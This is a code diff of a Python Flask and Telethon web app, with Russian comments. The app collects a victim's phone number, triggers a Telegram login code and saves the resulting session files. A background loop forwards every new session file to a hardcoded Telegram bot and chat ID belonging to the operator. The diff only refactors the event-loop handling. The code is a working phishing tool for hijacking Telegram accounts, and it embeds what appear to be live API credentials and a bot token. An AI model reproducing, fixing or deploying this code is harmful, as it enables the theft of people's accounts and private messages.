@@ -8,17 +8,22 @@ import threading
 API_ID = 26006502
 API_HASH = "9afc2208b8cec0afe06c9c2bc15b53e4"
 
-BOT_TOKEN = "8213641387:AAF8mmuXPt0AjLd5z7fpZIdChOY16rB-GyM"     # <-- сюда токен бота от @BotFather
-CHAT_ID = 7440693813              # <-- сюда свой Telegram ID (куда слать сообщения)
+BOT_TOKEN = "8213641387:AAF8mmuXPt0AjLd5z7fpZIdChOY16rB-GyM"  # токен бота
+CHAT_ID = 7440693813  # твой Telegram ID
 
 os.makedirs("sessions", exist_ok=True)
 
 app = Flask(__name__, template_folder="templates", static_folder="static")
+
+# Главный event loop
 loop = asyncio.new_event_loop()
 
-bot = TelegramClient('bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
+# Запуск бота в этом loop
+bot = TelegramClient('bot_session', API_ID, API_HASH, loop=loop)
 
 sent_files = set()
+clients = {}
+
 
 async def send_new_sessions():
     while True:
@@ -31,19 +36,31 @@ async def send_new_sessions():
                 sent_files.add(file_name)
             except Exception as e:
                 print(f"Ошибка при отправке файла {file_name}: {e}")
-        await asyncio.sleep(60)  # проверять каждые 60 секунд
+        await asyncio.sleep(60)
+
 
 def start_loop():
     asyncio.set_event_loop(loop)
+    loop.run_until_complete(bot.start(bot_token=BOT_TOKEN))
     loop.create_task(send_new_sessions())
     loop.run_forever()
 
+
 threading.Thread(target=start_loop, daemon=True).start()
 
-clients = {}
 
 def run_async(coro):
+    """Запускает корутину внутри нашего loop и возвращает результат"""
     return asyncio.run_coroutine_threadsafe(coro, loop).result()
+
+
+async def create_and_connect_client(session_name, phone):
+    """Создаём клиента внутри основного loop"""
+    client = TelegramClient(session_name, API_ID, API_HASH, loop=loop)
+    await client.connect()
+    await client.send_code_request(phone)
+    clients[phone] = client
+    return client
 
 
 @app.route("/", methods=["GET", "POST"])
@@ -55,14 +72,8 @@ def index():
 
         session_name = f"sessions/{phone}"
 
-        async def process():
-            client = TelegramClient(session_name, API_ID, API_HASH)
-            await client.connect()
-            await client.send_code_request(phone)
-            clients[phone] = client
-
         try:
-            run_async(process())
+            run_async(create_and_connect_client(session_name, phone))
             return render_template("index.html", stage="code", phone=phone)
         except Exception as e:
             return render_template("index.html", stage="phone", error=str(e))
